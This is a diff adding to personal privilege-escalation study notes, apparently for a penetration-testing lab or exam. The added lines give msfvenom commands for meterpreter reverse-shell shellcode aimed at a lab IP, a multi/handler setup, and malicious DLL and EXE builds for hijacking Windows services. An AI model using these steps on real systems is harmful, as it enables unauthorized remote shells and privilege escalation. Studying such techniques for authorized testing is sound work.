@@ -80,8 +80,32 @@ Privilege Escalation:
     - follow the steps to priv escalate
   - Buffer overflow:
     - if buffer overflow is needed, do which gdb - if buffer overflow is needed, it'll be there
+    - buffer overflow will be Secure Server on Windows
+    - to fire the overflow (windowsoverflow) set up a tunnel on the master socket closest to the target box going to the vulnerable port
+    - go into msfconsole, use multi/handler and set LHOST to 0.0.0.0, LPORT to the local port going to the target box, 
+      and your payload to windows/meterpreter/reverse_tcp
+    - IF YOU CHANGE THE PORTS/IP - you have to regenerate the shellcode in msfvenom - the command is already in the script comments
+    - msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.23.5 lport=5555 -b "\x00" -f python <- msfvenom syntax
+    - THE BUFFER OVERFLOW SCRIPT IS ALREADY CREATED - just change ip and port
+    - type shell in meterpreter to drop into a shell
   - SUID/SGID bits:
     - for all of these: for each file found, go on gtfobins and look through EACH FILE until you find the one you can escalate 
     - to find SUID bits - run find / -type f -perm /4000 [SUID bit set] -ls 2>/dev/null [don't forget the bit bucket]
     - to find SGID bits - find / -type f -perm /2000 -ls 2>/dev/null 
     - finding both bits set (last resort) - find / -type f -perm /6000 -ls 2>/dev/null
+  - Windows Escalation:
+    - search services - it'll be the first app that comes up
+    - look for blank descriptions, or clearly unprofessional descriptions
+    - check any found programs in their directories
+    - make sure you can view hidden items in file explorer
+    - to determine if you can do binary replacement or .dll injection, check if you can write in the folder - binary replacement is easier
+    - if you're given an executable, do binary replacement - if not, do .dll hijacking
+    -  Binary/.dll replacement/hijacking:
+        - Msfvenom can compile malicious binaries and .dlls
+        - Compiling .dll: msfvenom -p windows/exec CMD='cmd.exe /C "command you want to run" > C:\Users\[user to save to]\Desktop\[.dll file name].txt 
+          -b "\x00" -f dll > [file name where you want to save it on the linux box] 
+        - Compiling binary: msfvenom -p windows/exec CMD='cmd.exe' /C "[command you want to be run]" > C:\Users\[user]\Desktop\[file name] 
+          -b "\x00" -f exe > [file name].exe
+        - restart the box after running the new .exe file
+        - SCP from Windows grabbing file from Linux
+    - 
